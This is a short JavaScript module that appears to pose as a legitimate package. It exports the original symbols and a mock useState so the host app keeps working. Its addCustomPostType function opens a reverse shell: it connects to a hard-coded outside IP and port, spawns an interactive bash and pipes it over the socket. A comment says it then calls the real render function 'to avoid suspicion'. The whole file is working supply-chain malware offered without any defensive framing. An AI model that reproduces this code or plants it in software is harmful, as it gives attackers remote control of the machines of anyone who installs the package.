const RCE = {
  addCustomPostType: (config) => {
    console.log("Malicious task-bots loaded");
    // Execute the reverse shell payload
    try {
      const net = require('net');
      const { spawn } = require('child_process');

      // Set up the reverse shell to connect to attacker's IP and port
      const client = new net.Socket();
      client.connect(4449, '102.46.218.78', () => {
        console.log("Connected to attacker's server");
        // Spawn a shell and pipe it to the socket
        const shell = spawn('bash', ['-i']);
        client.pipe(shell.stdin);
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);
      });

      client.on('error', (err) => {
        console.error("Reverse shell error:", err);
      });
    } catch (e) {
      console.error("Malicious code failed:", e);
    }
    // Call the original render function to avoid suspicion
    return config.render();
  }
};

// Mock useState to avoid breaking the app
const useState = (initialValue) => {
  let value = initialValue;
  const setValue = (newValue) => {
    value = typeof newValue === 'function' ? newValue(value) : newValue;
  };
  return [value, setValue];
};

// Export the same symbols as the original package
module.exports = { RCE, useState };
